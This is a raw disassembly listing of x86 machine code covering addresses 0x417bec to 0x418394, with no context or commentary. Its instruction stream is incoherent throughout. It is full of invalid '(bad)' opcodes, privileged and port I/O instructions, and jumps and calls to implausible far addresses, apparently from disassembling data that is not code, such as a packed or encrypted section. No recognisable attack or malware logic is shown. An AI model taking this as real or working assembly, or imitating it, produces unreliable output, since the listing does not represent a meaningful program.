  417bec:	sub    eax,0x39b8c6e4
  417bf1:	mov    ah,0x7
  417bf3:	mov    gs,WORD PTR [ebx+eiz*1]
  417bf6:	scas   eax,DWORD PTR es:[edi]
  417bf7:	sti    
  417bf8:	pop    eax
  417bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bfa:	into   
  417bfb:	xchg   DWORD PTR [ebp-0x608b1614],ecx
  417c01:	xchg   DWORD PTR [edi+0x3c],esp
  417c04:	mov    ah,0x44
  417c06:	fwait
  417c07:	cs dec ecx
  417c09:	(bad)  
  417c0a:	enter  0xceab,0x7
  417c0e:	(bad)
  417c11:	xor    dh,BYTE PTR [edi+0x7a258d44]
  417c17:	mov    esi,0x3649cc80
  417c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c1d:	jne    0x417c83
  417c1f:	or     BYTE PTR ds:0x2df553dd,al
  417c25:	mov    ebp,0x453da928
  417c2a:	fwait
  417c2b:	call   0xdd59d6ee
  417c30:	mov    eax,0x9a0c22e7
  417c35:	loopne 0x417cb1
  417c37:	inc    esi
  417c38:	xchg   DWORD PTR [ebx-0x415169],edx
  417c3e:	pop    ss
  417c3f:	mov    bl,0xe9
  417c41:	jl     0x417c0c
  417c43:	or     cl,BYTE PTR [esi]
  417c45:	daa    
  417c46:	mov    eax,ds:0xd625cf86
  417c4b:	ret    
  417c4c:	pop    ebx
  417c4d:	cld    
  417c4e:	stos   BYTE PTR es:[edi],al
  417c4f:	mov    ch,0x81
  417c51:	sub    BYTE PTR [ebx+0x4f],bl
  417c54:	cmp    esp,DWORD PTR [ecx]
  417c56:	jle    0x417bfd
  417c58:	(bad)  
  417c5a:	(bad)  
  417c5b:	jmp    0x417cd0
  417c5d:	sub    ebp,DWORD PTR [edi-0x17ff5b49]
  417c63:	sahf   
  417c64:	and    eax,DWORD PTR [ebx+edi*2-0x4961e279]
  417c6b:	mov    al,0xce
  417c6d:	(bad)  
  417c6e:	frstor [ebx+0x7489c220]
  417c74:	rol    DWORD PTR [ebp-0x6de7b259],1
  417c7a:	loop   0x417c0d
  417c7c:	xrelease xchg BYTE PTR [eax+0x7cbe7dd4],bl
  417c83:	jns    0x417c99
  417c85:	jb     0x417c15
  417c87:	mov    fs,WORD PTR [esi+edx*1+0x43cd976e]
  417c8e:	(bad)  
  417c90:	ret    
  417c91:	ret    0x59b4
  417c94:	xor    ah,dl
  417c96:	mov    ss,WORD PTR [edi-0x4]
  417c99:	fsub   QWORD PTR [edi-0x3fb485af]
  417c9f:	and    esi,DWORD PTR [esi+0xc]
  417ca2:	mov    ch,0x81
  417ca4:	jo     0x417c9f
  417ca6:	loop   0x417cbb
  417ca8:	jl     0x417c68
  417caa:	mov    edi,0xc7d7da0d
  417caf:	xchg   ebx,eax
  417cb0:	dec    ebp
  417cb1:	in     eax,dx
  417cb2:	rol    ebp,0xe3
  417cb5:	daa    
  417cb6:	pop    esp
  417cb7:	jb     0x417c3b
  417cb9:	xlat   BYTE PTR ds:[ebx]
  417cba:	mov    ebx,0x7ee581b6
  417cbf:	popf   
  417cc0:	push   ss
  417cc1:	out    0x60,eax
  417cc3:	out    dx,eax
  417cc4:	ret    0x7f12
  417cc7:	icebp  
  417cc8:	jle    0x417c90
  417cca:	scas   eax,DWORD PTR es:[edi]
  417ccb:	std    
  417ccc:	jg     0x417d24
  417cce:	stos   BYTE PTR es:[edi],al
  417ccf:	or     ebx,ebx
  417cd1:	sar    DWORD PTR [ebp+ebx*2+0x19cba8e8],1
  417cd8:	pushf  
  417cd9:	fs mov eax,0xe9e7a6f5
  417cdf:	jae    0x417cad
  417ce1:	mov    cl,0x34
  417ce3:	pop    ecx
  417ce4:	xchg   esp,eax
  417ce5:	xchg   BYTE PTR [edi+0x7d63b5b9],al
  417ceb:	ds mov al,0x1f
  417cee:	addr16 inc esp
  417cf0:	cmp    esp,ecx
  417cf2:	jl     0x417cfc
  417cf4:	push   edx
  417cf5:	mov    eax,0xd49683da
  417cfa:	push   eax
  417cfb:	stos   DWORD PTR es:[edi],eax
  417cfc:	popa   
  417cfd:	mov    dl,0x9d
  417cff:	push   ebp
  417d00:	adc    al,0xfb
  417d02:	ins    DWORD PTR es:[edi],dx
  417d03:	inc    eax
  417d04:	push   edx
  417d05:	xor    BYTE PTR [ecx],0xd6
  417d08:	cmp    al,0x17
  417d0a:	inc    ecx
  417d0b:	(bad)  
  417d0d:	or     DWORD PTR [edx],ecx
  417d0f:	outs   dx,DWORD PTR ds:[esi]
  417d10:	nop    DWORD PTR [edx+ebp*4-0x6dacaecc]
  417d18:	mov    BYTE PTR [eax+0x7f],0x3c
  417d1c:	sbb    edi,edx
  417d1e:	add    dh,BYTE PTR [edi]
  417d20:	xor    esi,0x72
  417d23:	stc    
  417d24:	and    eax,0x5aad8cf7
  417d29:	cmp    BYTE PTR ds:0xa7bf7ad3,ch
  417d2f:	inc    ebx
  417d30:	adc    BYTE PTR [ebx+edx*8+0x1e1e1e80],cl
  417d37:	je     0x417d1a
  417d39:	lock push eax
  417d3b:	inc    esp
  417d3c:	or     cl,BYTE PTR [edx-0x4b]
  417d3f:	out    0xd9,eax
  417d41:	inc    ebp
  417d42:	dec    esi
  417d43:	push   cs
  417d44:	mov    dh,dl
  417d46:	fdivr  st,st(7)
  417d48:	pop    ebx
  417d49:	out    dx,eax
  417d4a:	and    ah,bh
  417d4c:	pop    ds
  417d4d:	repz dec BYTE PTR [ecx+0x3]
  417d51:	push   edi
  417d52:	xor    al,0x92
  417d54:	push   esi
  417d55:	xor    eax,0xcb30012b
  417d5a:	sbb    al,0xac
  417d5c:	add    BYTE PTR [edx+0x5b6890d0],ah
  417d62:	push   0x2b
  417d64:	adc    al,0x4f
  417d66:	ret    0x9591
  417d69:	and    bl,BYTE PTR [ebx]
  417d6b:	xchg   esi,eax
  417d6c:	scas   al,BYTE PTR es:[edi]
  417d6d:	fucomip st,st(0)
  417d6f:	xor    esp,DWORD PTR [ebp+0x18]
  417d72:	pusha  
  417d73:	xor    al,0xee
  417d75:	aam    0x5c
  417d77:	fs aas 
  417d79:	mov    esp,0x8cc645a8
  417d7e:	in     eax,0x20
  417d80:	push   ebx
  417d81:	jp     0x417d52
  417d83:	imul   ecx,DWORD PTR [ecx+0x4607f1ff],0x5393e8ba
  417d8d:	gs pushf 
  417d8f:	fs (bad) 
  417d91:	ja     0x417d13
  417d93:	enter  0x6fc8,0x5f
  417d97:	push   eax
  417d98:	sti    
  417d99:	and    eax,0x852672df
  417d9e:	inc    ebp
  417d9f:	adc    eax,0x5805d7db
  417da4:	stos   DWORD PTR es:[edi],eax
  417da5:	jno    0x417df4
  417da7:	shr    DWORD PTR [edx-0x7daff43a],0x3
  417dae:	les    ecx,FWORD PTR [edx-0x3b]
  417db1:	rol    bl,1
  417db3:	pop    ecx
  417db4:	pop    edi
  417db5:	mov    dh,0x72
  417db7:	inc    ecx
  417db8:	jge    0x417d5c
  417dba:	add    ch,BYTE PTR [edi-0x11]
  417dbd:	pop    ebx
  417dbe:	mov    ds:0x26d40f37,eax
  417dc3:	sub    al,0x7b
  417dc5:	and    cl,BYTE PTR [edi+0x27fc787e]
  417dcb:	pop    edx
  417dcc:	enter  0x80cc,0x31
  417dd0:	cdq    
  417dd1:	jp     0x417ddd
  417dd3:	or     eax,0x93fadbee
  417dd8:	data16 icebp 
  417dda:	into   
  417ddb:	call   0x235a:0x3495165a
  417de2:	int    0x7a
  417de4:	xchg   ebx,eax
  417de5:	jge    0x417e00
  417de7:	cmp    al,0x1e
  417de9:	and    cl,cl
  417deb:	pop    edi
  417dec:	jge    0x417e40
  417dee:	dec    esi
  417def:	jb     0x417e62
  417df1:	add    al,0xe3
  417df3:	add    cl,BYTE PTR [edx-0x31]
  417df6:	es (bad) 
  417df8:	pusha  
  417df9:	hlt    
  417dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dfb:	(bad)  
  417dfc:	jg     0x417d7e
  417dfe:	(bad)  
  417dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e00:	sbb    eax,0x214d0648
  417e05:	xor    eax,0x4d7951e2
  417e0a:	xlat   BYTE PTR ds:[ebx]
  417e0b:	bound  ebp,QWORD PTR [ebp-0x2d]
  417e0e:	and    BYTE PTR [esi+0x4a1cf125],bh
  417e14:	cwde   
  417e15:	mov    eax,ds:0xde8957af
  417e1a:	cmp    ch,bh
  417e1c:	not    BYTE PTR [ecx]
  417e1e:	adc    al,0xb5
  417e20:	and    dh,ch
  417e22:	mov    bh,bl
  417e24:	xor    edi,DWORD PTR [eax]
  417e26:	add    eax,DWORD PTR [edi]
  417e28:	inc    eax
  417e29:	repnz adc al,0x55
  417e2c:	xchg   edi,eax
  417e2d:	dec    ecx
  417e2e:	mov    al,0x22
  417e30:	in     al,dx
  417e31:	in     eax,0xae
  417e33:	jmp    0x54f6:0xf63ee324
  417e3a:	cld    
  417e3b:	ja     0x417de3
  417e3d:	inc    ebp
  417e3e:	popf   
  417e3f:	dec    ebp
  417e40:	or     esi,edx
  417e42:	mov    ch,0x62
  417e44:	cmp    BYTE PTR [eax+0x5891f632],bh
  417e4a:	mov    esi,0x425b39fa
  417e4f:	and    eax,0x9da7e236
  417e54:	mov    dl,0xc2
  417e56:	lods   eax,DWORD PTR ds:[esi]
  417e57:	call   0xc33a02a7
  417e5c:	add    DWORD PTR [edi-0x1c4aa1e1],esi
  417e62:	xor    edx,esp
  417e64:	and    DWORD PTR [esi],ecx
  417e66:	mov    WORD PTR [ebx-0x56be2afe],cs
  417e6c:	push   ds
  417e6d:	push   ebp
  417e6e:	mov    edi,0x986a656e
  417e73:	inc    esi
  417e74:	ja     0x417e3d
  417e76:	xor    cl,BYTE PTR [ecx]
  417e78:	fiadd  DWORD PTR [esi]
  417e7a:	xor    BYTE PTR [edi],ah
  417e7c:	push   ebx
  417e7d:	ins    BYTE PTR es:[edi],dx
  417e7e:	inc    eax
  417e7f:	pop    ebp
  417e80:	jecxz  0x417ef0
  417e82:	ffree  st(3)
  417e84:	idiv   edx
  417e86:	sti    
  417e87:	rol    esi,cl
  417e89:	repnz mov dl,0xc2
  417e8c:	dec    edx
  417e8d:	push   ebx
  417e8e:	dec    ebx
  417e8f:	test   DWORD PTR [eax],eax
  417e91:	jecxz  0x417e9c
  417e93:	dec    esi
  417e94:	xadd   DWORD PTR [ecx+ebx*4+0x3cf49605],esi
  417e9c:	dec    BYTE PTR [eax]
  417e9e:	in     eax,dx
  417e9f:	jne    0x417ec0
  417ea1:	pop    ebx
  417ea2:	pop    eax
  417ea3:	test   al,0xe
  417ea5:	xchg   edx,eax
  417ea6:	pop    ecx
  417ea7:	push   es
  417ea8:	and    BYTE PTR [ebp-0x5b],bh
  417eab:	mov    ebp,0x302b26c4
  417eb0:	es dec eax
  417eb2:	xor    al,0x5a
  417eb4:	ds jge 0x417e89
  417eb7:	imul   edi,DWORD PTR [esi],0x7bdf1f29
  417ebd:	jbe    0x417ec0
  417ebf:	bound  eax,QWORD PTR [edi+ebx*2]
  417ec2:	outs   dx,BYTE PTR ds:[esi]
  417ec3:	pop    ebp
  417ec4:	call   0x6b7e1994
  417ec9:	stc    
  417eca:	sbb    ebp,DWORD PTR [ecx]
  417ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ecd:	jge    0x417eb4
  417ecf:	push   ss
  417ed0:	(bad)  
  417ed1:	enter  0xbb98,0xf8
  417ed5:	jne    0x417f1b
  417ed7:	fld    TBYTE PTR [ecx]
  417ed9:	xchg   esp,eax
  417eda:	cmp    cl,BYTE PTR [edi+0x48]
  417edd:	push   esp
  417ede:	xor    DWORD PTR [edx-0x40],ebp
  417ee1:	pop    edi
  417ee2:	add    al,0x70
  417ee4:	xchg   DWORD PTR [esi],edi
  417ee6:	dec    edi
  417ee7:	sbb    BYTE PTR ds:0xb60d2dea,bl
  417eed:	xchg   bp,ax
  417eef:	ins    BYTE PTR es:[edi],dx
  417ef0:	dec    eax
  417ef1:	jge    0x417f2b
  417ef3:	add    esp,0x40eb89fd
  417ef9:	ins    DWORD PTR es:[edi],dx
  417efa:	outs   dx,BYTE PTR ds:[esi]
  417efb:	add    dl,BYTE PTR [ebp+0x6f822e29]
  417f01:	cmp    eax,0x6635a3b
  417f06:	lock cld 
  417f08:	in     al,dx
  417f09:	pop    eax
  417f0a:	lock add eax,0x89f81054
  417f10:	xchg   ebp,eax
  417f11:	mov    bl,BYTE PTR [eax*4+0x23909ba2]
  417f18:	and    eax,0xe5fed6ed
  417f1d:	xchg   ecx,eax
  417f1e:	sub    dh,BYTE PTR [edx-0x6f]
  417f21:	(bad)  [ecx-0x21]
  417f24:	inc    esp
  417f25:	bound  ebx,QWORD PTR [ebx+edx*2-0x2d]
  417f29:	jecxz  0x417f81
  417f2b:	dec    ebx
  417f2c:	xor    eax,0x2125232b
  417f31:	xor    eax,0x3bc38bae
  417f36:	out    dx,eax
  417f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f38:	lock iret 
  417f3a:	xor    al,0x78
  417f3c:	jmp    0xdedd:0x54eedf9e
  417f43:	adc    al,BYTE PTR [esi-0x3f]
  417f46:	jmp    0x417faf
  417f48:	sub    al,0xa8
  417f4a:	push   0x9a679861
  417f4f:	push   es
  417f50:	xor    bh,BYTE PTR [esi]
  417f52:	mov    cl,0x40
  417f54:	dec    ebx
  417f55:	dec    ebx
  417f56:	push   ecx
  417f57:	call   0xdca477b2
  417f5c:	mov    dh,0x52
  417f5e:	jns    0x417f66
  417f60:	mov    dh,0xea
  417f62:	loopne 0x417f4f
  417f64:	iret   
  417f65:	cmp    BYTE PTR [edi+0x24],cl
  417f68:	ins    DWORD PTR es:[edi],dx
  417f69:	repnz arpl WORD PTR [edx+0x39],si
  417f6d:	jmp    0x417fe0
  417f6f:	xlat   BYTE PTR ds:[ebx]
  417f70:	jbe    0x417f34
  417f72:	es mov ch,0x6b
  417f75:	inc    ebp
  417f76:	cmp    ch,ah
  417f78:	sbb    al,0x3
  417f7a:	lea    esp,[esi-0x1e]
  417f7d:	pop    esp
  417f7e:	loope  0x417f31
  417f80:	cmp    eax,0xe9c39dd1
  417f85:	ins    BYTE PTR es:[edi],dx
  417f86:	sahf   
  417f87:	cli    
  417f88:	enter  0x248f,0xb1
  417f8c:	mov    ds:0x4e3e28cb,eax
  417f91:	inc    ebp
  417f92:	scas   al,BYTE PTR es:[edi]
  417f93:	je     0x417fb1
  417f95:	stc    
  417f96:	add    BYTE PTR [edx-0x45],bl
  417f99:	cwde   
  417f9a:	mov    eax,0xeb7d0a01
  417f9f:	aas    
  417fa0:	cld    
  417fa1:	cli    
  417fa2:	jg     0x417fb1
  417fa4:	js     0x41801e
  417fa6:	cmp    bh,BYTE PTR [esi]
  417fa8:	pop    edx
  417fa9:	sbb    bh,dh
  417fab:	outs   dx,BYTE PTR ds:[esi]
  417fac:	pop    es
  417fad:	xchg   ebx,eax
  417fae:	arpl   sp,bx
  417fb0:	psrad  mm3,QWORD PTR [eax-0x5b225164]
  417fb7:	add    DWORD PTR [ebp+edi*8+0x0],esi
  417fbb:	sub    al,0xe4
  417fbd:	(bad)  
  417fbe:	(bad)  [ebp-0x2a]
  417fc1:	sub    eax,DWORD PTR [edi-0x57]
  417fc4:	fcomp  DWORD PTR [ebx]
  417fc6:	shr    BYTE PTR [ecx],cl
  417fc8:	dec    eax
  417fc9:	xchg   edi,eax
  417fca:	mov    ?,WORD PTR [ecx-0xa]
  417fcd:	fcmovnb st,st(3)
  417fcf:	nop
  417fd0:	popa   
  417fd1:	ret    
  417fd2:	aad    0x7c
  417fd4:	cmc    
  417fd5:	jmp    0x904d:0x5f187e07
  417fdc:	jno    0x417fb2
  417fde:	mov    bl,BYTE PTR [eax+0x223826ae]
  417fe4:	adc    eax,0x8991bf8f
  417fe9:	dec    ebx
  417fea:	jne    0x418015
  417fec:	imul   BYTE PTR [edx+edx*1]
  417fef:	not    BYTE PTR [eax]
  417ff1:	leave  
  417ff2:	retf   
  417ff3:	retf   0xbbfc
  417ff6:	das    
  417ff7:	mov    dh,0x83
  417ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ffa:	ret    0xcdbe
  417ffd:	inc    DWORD PTR ds:0x7c4c1dbb
  418003:	mov    al,ds:0xca533139
  418008:	adc    bh,BYTE PTR [eax-0x42]
  41800b:	lds    edx,FWORD PTR [edx+eiz*4+0x7a2d3289]
  418012:	xchg   esi,eax
  418013:	test   al,0x15
  418015:	xchg   ecx,esp
  418017:	push   eax
  418018:	popa   
  418019:	repz mov ds:0x63da1961,eax
  41801f:	and    ch,BYTE PTR [edx]
  418021:	int3   
  418022:	jge    0x417ff8
  418024:	out    0x4c,eax
  418026:	bound  edx,QWORD PTR [edx]
  418028:	push   esp
  418029:	xlat   BYTE PTR ds:[ebx]
  41802a:	loopne 0x418078
  41802c:	dec    esi
  41802d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41802e:	inc    edx
  41802f:	jg     0x418092
  418031:	and    BYTE PTR [edx+ebp*1+0x2aedece9],bh
  418038:	nop
  418039:	addr16 mov esp,0x7db9d3b4
  41803f:	xchg   dl,bh
  418041:	and    bl,BYTE PTR [ecx+0x67]
  418044:	aas    
  418045:	iret   
  418046:	pusha  
  418047:	pop    eax
  418048:	mov    edx,0x4598bdb
  41804d:	popf   
  41804e:	mov    BYTE PTR [ebx],bl
  418050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418051:	add    DWORD PTR [ecx+0x458907a],eax
  418057:	and    al,BYTE PTR [edi-0x42]
  41805a:	imul   esi,DWORD PTR [ecx],0x61
  41805d:	lock shr BYTE PTR [ebp-0x35],1
  418061:	pop    ss
  418062:	cmp    DWORD PTR [edi],ecx
  418064:	rcl    DWORD PTR [ebx+0x4a9c12b6],cl
  41806a:	daa    
  41806b:	xor    al,0xac
  41806d:	mov    edi,0xb56517e5
  418072:	inc    edx
  418073:	adc    ah,BYTE PTR fs:[ecx-0x6d]
  418077:	ins    BYTE PTR es:[edi],dx
  418078:	jb     0x418073
  41807a:	sub    bh,BYTE PTR [ecx-0x65d7ddb3]
  418080:	cmp    ecx,DWORD PTR [ebp-0x1b7efd4b]
  418086:	jmp    0x59c7:0xe4a6d983
  41808d:	dec    esp
  41808e:	sahf   
  41808f:	jle    0x418079
  418091:	aad    0x7f
  418093:	lahf   
  418094:	dec    esp
  418095:	dec    ebx
  418096:	outs   dx,DWORD PTR ds:[esi]
  418097:	ret    
  418098:	add    DWORD PTR [ebx-0x5c],ecx
  41809b:	cmp    edi,DWORD PTR [edi+0x14c3c275]
  4180a1:	rol    DWORD PTR [eax+0x25e988d6],cl
  4180a7:	stos   DWORD PTR es:[edi],eax
  4180a8:	js     0x4180e7
  4180aa:	cmp    ax,0xdaa9
  4180ae:	and    DWORD PTR [edx+0x24],0x84381525
  4180b5:	popf   
  4180b6:	pop    ds
  4180b7:	clc    
  4180b8:	or     ch,BYTE PTR [ecx+0x2b]
  4180bb:	fcom   DWORD PTR [esi-0x4f62be80]
  4180c1:	call   0x31e2d9f3
  4180c6:	clc    
  4180c7:	call   0xf761:0xba99e7b
  4180ce:	jge    0x418120
  4180d0:	addr16 mov eax,0x444a8e38
  4180d6:	or     al,ch
  4180d8:	xchg   bh,cl
  4180da:	or     al,0x1c
  4180dc:	lea    eax,[ebx+0x4]
  4180df:	test   al,0x11
  4180e2:	pop    esi
  4180e3:	rcr    edi,0x74
  4180e6:	jno    0x41813b
  4180e8:	mov    eax,?
  4180ea:	push   cs
  4180eb:	jge    0x4180f7
  4180ed:	push   ecx
  4180ee:	adc    BYTE PTR [ebx],bl
  4180f0:	addr16 dec esi
  4180f2:	lods   al,BYTE PTR ds:[esi]
  4180f3:	cmp    ch,dh
  4180f5:	inc    esi
  4180f6:	sbb    al,0xce
  4180f8:	mov    esi,0xd96e7ebe
  4180fd:	iret   
  4180fe:	adc    BYTE PTR [ecx-0x17ed14f7],bh
  418104:	mov    ss,edx
  418106:	ror    BYTE PTR [esi-0x22],1
  418109:	push   bx
  41810b:	(bad)  
  41810c:	scas   eax,DWORD PTR es:[edi]
  41810d:	loopne 0x41811f
  41810f:	pop    edx
  418110:	jecxz  0x4180c0
  418112:	xchg   esp,eax
  418113:	add    al,0xd5
  418115:	fimul  DWORD PTR [esi+0x597ce93]
  41811b:	cmp    al,0xf1
  41811d:	jle    0x418181
  41811f:	cmp    edx,DWORD PTR [esi+edx*1]
  418122:	dec    ecx
  418123:	xchg   ebx,eax
  418124:	mov    WORD PTR [eax],ss
  418126:	ins    DWORD PTR es:[di],dx
  418128:	pushf  
  418129:	and    eax,0xa84f3a7f
  41812e:	jb     0x41817d
  418130:	mov    bl,0xa2
  418132:	les    ebx,FWORD PTR [edx+0x12]
  418135:	mov    dh,0xcb
  418137:	ret    
  418138:	xchg   esi,eax
  418139:	mov    ds:0x7be0e2c8,eax
  41813e:	call   0x2c1465f6
  418143:	mov    ecx,DWORD PTR ds:0xc6cb953d
  418149:	jp     0x41816c
  41814b:	in     al,0x5e
  41814d:	add    DWORD PTR [ecx+0x6b],eax
  418150:	jecxz  0x4181a7
  418152:	adc    DWORD PTR [edi],ebx
  418154:	mov    ah,BYTE PTR [edi]
  418156:	pop    ebx
  418157:	push   edx
  418158:	xchg   esp,eax
  418159:	lods   eax,DWORD PTR ds:[esi]
  41815a:	(bad)  
  41815b:	out    0xbd,eax
  41815d:	(bad)  
  41815e:	les    ecx,FWORD PTR [edi]
  418160:	ins    BYTE PTR es:[edi],dx
  418161:	cmp    BYTE PTR [edx+0x10bf1ae7],dh
  418167:	loop   0x4181b6
  418169:	pop    eax
  41816a:	js     0x4180f4
  41816c:	or     BYTE PTR [eax],ch
  41816e:	aam    0xb7
  418170:	mov    esp,0x8b42729c
  418175:	out    0x76,eax
  418177:	mov    al,0x1e
  418179:	dec    ebp
  41817a:	push   ds
  41817b:	pop    ecx
  41817c:	sub    BYTE PTR [esi+0x6c],bh
  41817f:	jnp    0x41810c
  418181:	popf   
  418182:	loop   0x4181cd
  418184:	sub    eax,esp
  418186:	push   es
  418187:	jl     0x418204
  418189:	pop    es
  41818a:	iret   
  41818b:	iret   
  41818c:	xchg   edx,eax
  41818d:	cmp    BYTE PTR [eax+0x4c],0xe7
  418191:	or     WORD PTR [ecx+0x3012bd1e],di
  418198:	dec    BYTE PTR [ecx-0xe]
  41819b:	test   BYTE PTR [edx+0x7f7279b3],0xd6
  4181a2:	iret   
  4181a3:	loop   0x418158
  4181a5:	push   edi
  4181a6:	sub    al,0xa3
  4181a8:	add    bl,0xa6
  4181ab:	inc    esi
  4181ac:	repnz mov esp,es
  4181af:	dec    esp
  4181b0:	addr16 (bad) 
  4181b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181b3:	push   ebp
  4181b4:	(bad)  
  4181b5:	in     al,0x44
  4181b7:	jno    0x4181dd
  4181b9:	fnsave [esi]
  4181bb:	test   eax,0xb4dede98
  4181c0:	loope  0x41818c
  4181c2:	popa   
  4181c3:	fucomip st,st(1)
  4181c5:	adc    al,BYTE PTR [esi+0x52082d43]
  4181cb:	push   eax
  4181cc:	or     dh,BYTE PTR [esi+ecx*2]
  4181cf:	jns    0x4181c2
  4181d1:	pop    edi
  4181d2:	ret    
  4181d3:	xchg   edi,eax
  4181d4:	cmp    eax,0xbcf2509a
  4181d9:	dec    ebp
  4181da:	inc    DWORD PTR [esi+0x6c]
  4181dd:	aas    
  4181de:	sub    BYTE PTR [edx],ch
  4181e0:	mov    cl,0xc2
  4181e2:	bound  ebp,QWORD PTR [ebp-0x22573b1d]
  4181e8:	leave  
  4181e9:	or     eax,0x30378701
  4181ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181ef:	aad    0x71
  4181f1:	scas   al,BYTE PTR es:[edi]
  4181f2:	ds mov ebp,0xc9aac0db
  4181f8:	outs   dx,BYTE PTR ds:[esi]
  4181f9:	imul   edx,DWORD PTR es:[esp+edi*1-0x37],0xfada4d98
  418202:	ret    
  418203:	bound  esp,QWORD PTR [eax]
  418205:	lock mov al,BYTE PTR [edx+0x4c]
  418209:	jno    0x4181a4
  41820b:	adc    dh,BYTE PTR [ebx]
  41820d:	(bad)  
  41820e:	fidiv  WORD PTR [edx]
  418210:	inc    ebp
  418211:	cli    
  418212:	retf   0x3640
  418215:	jb     0x418251
  418217:	pop    ss
  418218:	call   0xca55:0xa4c30153
  41821f:	jp     0x4181d7
  418221:	pop    ebx
  418222:	add    al,0xfb
  418224:	sbb    BYTE PTR [edx],ah
  418226:	mov    ds:0x35bb8820,eax
  41822b:	pusha  
  41822c:	fs xchg esi,eax
  41822e:	and    ecx,ebp
  418230:	ins    BYTE PTR es:[edi],dx
  418231:	jo     0x4181e7
  418233:	cmp    esp,esi
  418235:	mov    al,ds:0x6bc5d1a0
  41823a:	stos   DWORD PTR es:[edi],eax
  41823b:	sub    eax,DWORD PTR [eax+edi*4-0x30]
  41823f:	imul   edx,DWORD PTR [eax-0x47],0xcc96a03b
  418246:	rcr    DWORD PTR [ecx-0x30],cl
  418249:	arpl   WORD PTR [esi+0x201e8e2c],cx
  41824f:	test   DWORD PTR [esi+0x29a62733],edx
  418255:	in     eax,dx
  418256:	data16 mov al,0x6
  418259:	push   eax
  41825a:	pop    esp
  41825b:	push   0x10
  41825d:	add    eax,0xdcf683c4
  418262:	dec    ebp
  418263:	inc    ebp
  418264:	ins    DWORD PTR es:[edi],dx
  418265:	and    eax,0x832754a2
  41826a:	hlt    
  41826b:	mov    bh,0x30
  41826d:	xor    ah,BYTE PTR [ebp+edx*1+0x2dfc10e8]
  418274:	pop    edi
  418275:	pop    esp
  418276:	retf   0x10b8
  418279:	jnp    0x4182c0
  41827b:	jmp    0xc5ca25de
  418280:	test   BYTE PTR [esi],ah
  418282:	ret    
  418283:	cmc    
  418284:	jnp    0x41823a
  418286:	mov    dl,0x5a
  418288:	in     al,0x39
  41828a:	push   esi
  41828b:	xchg   esi,eax
  41828c:	mov    esp,0x806bf424
  418291:	cmp    BYTE PTR [edx],cl
  418293:	sub    ebp,DWORD PTR [edx+eax*4]
  418296:	pop    ss
  418297:	add    al,0xae
  418299:	jmp    0xa46f:0xe9809668
  4182a0:	shr    DWORD PTR [ebx-0x492ebf3a],cl
  4182a6:	in     eax,dx
  4182a7:	xlat   BYTE PTR ds:[ebx]
  4182a8:	cli    
  4182a9:	cmp    DWORD PTR [edx+0x72c85003],0xe35c4970
  4182b3:	or     BYTE PTR [ecx-0x8d0254d],dh
  4182b9:	and    BYTE PTR [edx-0x45533ca1],al
  4182bf:	stc    
  4182c0:	nop
  4182c1:	les    esi,FWORD PTR [ebx+0x6]
  4182c4:	add    ebx,DWORD PTR [edi+0x3c]
  4182c7:	mov    ah,0xe8
  4182c9:	xchg   ebx,eax
  4182ca:	add    DWORD PTR [edx],0xfffffff8
  4182cd:	or     bh,BYTE PTR ds:0x73d7314d
  4182d3:	push   ds
  4182d4:	fsub   QWORD PTR fs:[edx-0x1940060]
  4182db:	daa    
  4182dc:	mov    eax,ds:0x96cade15
  4182e1:	mov    bl,0xa0
  4182e3:	mov    DWORD PTR [ebx+0x201c7119],ebp
  4182e9:	rep stos DWORD PTR es:[edi],eax
  4182eb:	iret   
  4182ec:	popf   
  4182ed:	fwait
  4182ee:	and    ebx,DWORD PTR es:[edx]
  4182f1:	jno    0x41831a
  4182f3:	mov    edx,0x6015bf00
  4182f8:	and    eax,0x4ae1072b
  4182fd:	sub    cl,BYTE PTR [edx-0xdc67501]
  418303:	xchg   edi,eax
  418304:	jmp    0x4182ed
  418306:	mov    eax,ds:0x4064cf83
  41830b:	ror    DWORD PTR [edx],0x26
  41830e:	adc    al,0xfb
  418310:	xor    al,0x76
  418312:	rcl    DWORD PTR [ebx+0x5c],0x2b
  418316:	push   edi
  418317:	mov    dl,0x40
  418319:	mov    dl,0x97
  41831b:	lods   eax,DWORD PTR ds:[esi]
  41831c:	xor    eax,edx
  41831e:	xchg   ebp,eax
  41831f:	xor    dh,al
  418321:	cld    
  418322:	inc    edx
  418323:	in     al,0x4e
  418325:	and    eax,0x7e4e9145
  41832a:	pop    esi
  41832b:	mov    al,ds:0xcb4cf867
  418330:	mov    cl,0x44
  418332:	inc    ebp
  418333:	mov    dl,BYTE PTR [ebp-0x35]
  418336:	xchg   esp,eax
  418337:	cli    
  418338:	pop    ebx
  418339:	xlat   BYTE PTR ds:[ebx]
  41833a:	inc    eax
  41833b:	mov    ds:0x533f0e22,eax
  418340:	aam    0xeb
  418342:	xchg   ebx,eax
  418343:	ins    BYTE PTR es:[edi],dx
  418344:	ror    BYTE PTR [edi-0x271f88d9],0x11
  41834b:	inc    eax
  41834c:	cmp    al,0xd7
  41834e:	fidiv  WORD PTR [esi]
  418350:	push   eax
  418351:	mov    ?,WORD PTR [ecx+0x298497aa]
  418357:	stc    
  418358:	and    dh,0xb3
  41835b:	xor    bh,bh
  41835d:	pushf  
  41835e:	add    eax,0x779714ab
  418363:	fs push ds
  418365:	sub    ecx,DWORD PTR [ebp+0x37611cd2]
  41836b:	daa    
  41836c:	sub    al,0x60
  41836e:	mov    edi,edx
  418370:	jae    0x4183f0
  418372:	jno    0x4183e4
  418374:	imul   edx,eax,0xa0009c22
  41837a:	inc    eax
  41837b:	enter  0x81a5,0x54
  41837f:	retf   
  418380:	xor    DWORD PTR [ebp-0x1569081e],ebp
  418386:	(bad)  
  418387:	int    0xeb
  418389:	mov    al,ds:0xf30bbac8
  41838e:	aaa    
  41838f:	adc    DWORD PTR [ebx-0xa],0x79
  418393:	cwde   
  418394:	test   eax,0xf885cf5b
